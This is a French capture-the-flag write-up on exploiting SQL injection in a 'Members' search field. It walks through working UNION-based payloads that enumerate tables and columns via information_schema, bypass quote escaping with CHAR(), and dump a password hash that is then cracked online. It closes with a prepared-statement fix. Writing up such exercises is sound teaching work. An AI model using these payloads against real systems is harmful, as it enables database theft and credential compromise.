### Comment la faille a été trouvée:

1. De retour sur la page d'accueil, on clique sur "Members". On tombe sur une barre de recherche.
2. On écrit `'` dans la barre de recherche puis valide. On obtient ce message d'erreur:
*"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1"*
3. Cela nous indique que l’input n’est pas filtré.
On va essayer de recuperer la tag avec l'injection UNION. Pour cela il faut d'abord connaitre le nombre de
colonnes totales. 

### Comment la faille a été exploitée:

4. Nous allons procéder avec le  payload `ORDER BY`.
Nous commencons donc par `""`
J'obtiens : *"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\' ORDER BY 1--' at line 1"*
5. Ça signifie que l’apostrophe ' que l'on a ajouté n’est pas correctement "fermée".
La requête attendue ressemble probablement à `SELECT * FROM membres WHERE id = '$input';`
Et nous tentons cette approche `SELECT * FROM membres WHERE id = '' ORDER BY 1--';`.
Il y a une apostrophe de trop.
6. On ré-injecte `' ORDER BY 1 -- -`. Ici `-- -`, est utilisé pour mettre en commentaire tout ce qui pourrait suivre la commande SQL.
On obtient cette erreur *"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\' ORDER BY 1 -- -' at line 1"*. Cela nous dit que le serveur échappe automatiquement les apostrophes ' en les remplaçant par \', ce qui bloque l’injection classique.

7. Maintenant ca fonctionne (voir [1_ere_injection_reussie](./1_ere_injection_reussie.png)).
Nous répétons cette étape jusqu'à `1 ORDER BY 3 -- -`. On obtient cette erreur: *"Unknown column '3' in 'order clause'"*

8. Nous avons donc un tableau à 2 colonnes. Nous allons maintenant procéder à une requête UNION pour récupérer les
infos du tableau : `1 UNION SELECT 1,2 -- -` (voir [2_eme_injection_reussie](./2_eme_injection_reussie.png))
On sait maintenant que la conne 1=First Name et la colonne 2=Surname

9. Maintenant on va essayer d'afficher le nom des tables a travers Firstname:
`1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = database() -- -`
(voir [3_eme_injection_reussie](./3_eme_injection_reussie.png))

10. Donc il y a une table nommée `users` dans la base.
On va chercher a afficher les differentes colonnes dans la table `Users` avec:
`1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = CHAR(117,115,101,114,115) -- -`
On utilise `CHAR(117,115,101,114,115)` (=user) car sinon on recoit une erreur. "\'" n'est pas bien interprété si
écrit en brut.

11. On découvre toutes les colonnes de la table users (voir [4_eme_injection_reussie](./4_eme_injection_reussie.png)).
*Colonnes: user_id, first_name, last_name, town, country, planet, Commentaire, countersign.*

11. On ne voit pas de colonne explicitement appelée flag, mais:
Dans les CTFs pédagogiques, le flag est souvent caché dans une colonne “innocente”, comme : *comment, description, message, ou ici → Commentaire*
Pour afficher les données de la colonne: `1 UNION SELECT Commentaire, 2 FROM users -- -`

12. On obtient la liste des données associées à `Commentaire` (voir [5_eme_injection_reussie](./5_eme_injection_reussie.png))
On peut lire pour le dernier élément: *"Decrypt this password -> then lower all the char. Sh256 on it and it's good"*

13. On peut obtenir le password mentionné dans la colonne countersign (synonyme de "mot de passe").
On fait: `1 UNION SELECT countersign, 2 FROM users -- -`
On obtient pour le même index de l'indice: 5ff9d0165b4f92b14994e5c685cdce28 (voir [6_eme_injection_reussie](./6_eme_injection_reussie.png))

14. On met le hash dans:
https://crackstation.net/ (voir [7](./7.png))
On obtient le password en brut: `"FortyTwo"` que l'on met en minuscule => `"fortytwo"`.

15. Et enfin on aplique le hachage Sh256 via https://emn178.github.io/online-tools/sha256.html
Ce qui nous donne le flag ! (voir [8](./8.png))

### Comment la faille peut être corrigée:

16. Problème: Aucun parsing n'est fait sur l'input utilisateur.
Ne plus faire une phrase complète en collant les morceaux (commande + input utilisateur).

Mais d'abord envoyer la commande de base: `SELECT * FROM users WHERE id = ?`
Puis ensuite remplace ? par la valeur transmise (= plus considere comme un bout de commande), 

En **php** ca se traduirait par:
```php
$input = "1 OR 1=1";
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); // commande de base
$stmt->execute([$input]); // input utilisateur
```